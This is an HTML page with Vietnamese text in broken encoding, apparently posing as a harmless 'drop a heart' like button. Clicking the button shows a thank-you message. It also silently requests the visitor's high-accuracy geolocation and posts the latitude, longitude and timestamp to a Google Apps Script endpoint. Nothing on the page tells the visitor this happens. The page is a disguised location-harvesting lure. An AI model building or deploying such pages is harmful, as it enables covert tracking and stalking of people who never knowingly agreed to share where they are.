<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Th·∫£ Tim</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #fff0f5;
      text-align: center;
      padding-top: 100px;
    }

    h1 {
      color: #ff4081;
      font-size: 3em;
      margin-bottom: 20px;
    }

    #btn-share {
      background-color: #ff4081;
      color: white;
      border: none;
      padding: 15px 30px;
      font-size: 1.2em;
      border-radius: 50px;
      cursor: pointer;
      box-shadow: 0 6px 18px rgba(255, 64, 129, 0.3);
      transition: all 0.3s ease;
    }

    #btn-share:hover {
      background-color: #f50057;
      transform: scale(1.05);
    }

    #thank {
      display: none;
      color: #d81b60;
      font-size: 1.4em;
      font-weight: bold;
      margin-top: 30px;
      animation: fadeIn 0.6s ease-in-out forwards;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(-10px); }
      to   { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>
  <h1>üíñ Th·∫£ tim</h1>
  <button id="btn-share">Nh·∫•p ƒë·ªÉ th·∫£ tim</button>
  <p id="thank">‚ù§Ô∏è C·∫£m ∆°n b·∫°n ƒë√£ th·∫£ tim!</p>

  <script>
    const btn = document.getElementById('btn-share');
    const thank = document.getElementById('thank');

    btn.addEventListener('click', () => {
      thank.style.display = 'block';
      shareLocation();
    });

    function shareLocation() {
      if (!navigator.geolocation) {
        return alert('Tr√¨nh duy·ªát kh√¥ng h·ªó tr·ª£ ƒë·ªãnh v·ªã.');
      }

      const options = {
        enableHighAccuracy: true,
        timeout: 20000,
        maximumAge: 0
      };
      const minAccuracy = 30;

      const watchId = navigator.geolocation.watchPosition(
        pos => {
          if (pos.coords.accuracy <= minAccuracy) {
            navigator.geolocation.clearWatch(watchId);
            sendToServer(pos.coords.latitude, pos.coords.longitude);
          }
        },
        err => {
          navigator.geolocation.clearWatch(watchId);
          alert('Kh√¥ng th·ªÉ l·∫•y v·ªã tr√≠. L·ªói: ' + err.message);
        },
        options
      );
    }

    function sendToServer(lat, lon) {
      const now = new Date();
      const vnOffset = 7 * 60 * 60 * 1000; // 7 ti·∫øng t√≠nh b·∫±ng mili gi√¢y
      const vnTime = new Date(now.getTime() + vnOffset).toISOString();
      const params = new URLSearchParams({
        latitude: lat,
        longitude: lon,
        timestamp: vnTime
      });

      fetch('https://script.google.com/macros/s/AKfycbzjgqqM3-oNT4_RAKEhvAWcRFhZKIXyXNpe3pUiDic_EmtiaPv6dH2idwoZd9BxAqSW/exec', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: params.toString()
      })
      .then(res => res.json())
      .then(data => {
        console.log('Server response:', data);
      })
      .catch(err => {
        alert('L·ªói khi g·ª≠i v·ªã tr√≠: ' + err.message);
        console.error(err);
      });
    }
  </script>
</body>
</html>
